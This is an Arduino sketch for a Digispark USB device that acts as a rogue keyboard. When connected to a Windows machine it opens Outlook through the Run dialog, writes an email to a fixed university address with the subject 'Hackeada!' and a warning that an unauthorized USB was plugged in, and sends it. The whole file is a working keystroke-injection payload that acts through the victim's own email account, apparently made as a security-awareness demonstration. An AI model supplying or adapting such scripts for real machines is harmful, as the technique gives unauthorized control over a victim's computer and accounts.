#include "DigiKeyboard.h"

#define KEY_Tabulate 43

void setup() {

  DigiKeyboard.sendKeyStroke(0);

  DigiKeyboard.delay(500);

  // Abrir Outlook
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.print("outlook");
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(9000);  // Esperar a que Outlook se abra (ajusta según sea necesario)

  // Comenzar un nuevo correo
  DigiKeyboard.sendKeyStroke(KEY_N, MOD_CONTROL_LEFT);
  DigiKeyboard.delay(2000);  // Esperar a que se abra la ventana de nuevo correo (ajusta según sea necesario)

  // Escribir la dirección de correo electrónico
  DigiKeyboard.print("z32maroa");
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_2, MOD_ALT_RIGHT);
  DigiKeyboard.delay(1000);
  DigiKeyboard.print("uco.es");
  DigiKeyboard.delay(500);

  // Mover al campo "Asunto"
  DigiKeyboard.sendKeyStroke(KEY_Tabulate);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_Tabulate);
  DigiKeyboard.delay(500);

  // Escribir el asunto
  DigiKeyboard.print("Hackeada!");
  DigiKeyboard.delay(500);

  // Mover al cuerpo del correo
  DigiKeyboard.sendKeyStroke(KEY_Tabulate);
  DigiKeyboard.delay(500);

  // Escribir el cuerpo del correo
  DigiKeyboard.print("Has conectado un USB que no deberias");
  DigiKeyboard.delay(500);

  // Enviar el correo
  DigiKeyboard.sendKeyStroke(KEY_ENTER, MOD_CONTROL_LEFT);
}

void loop() {
  // Nothing to repeat in this example
}
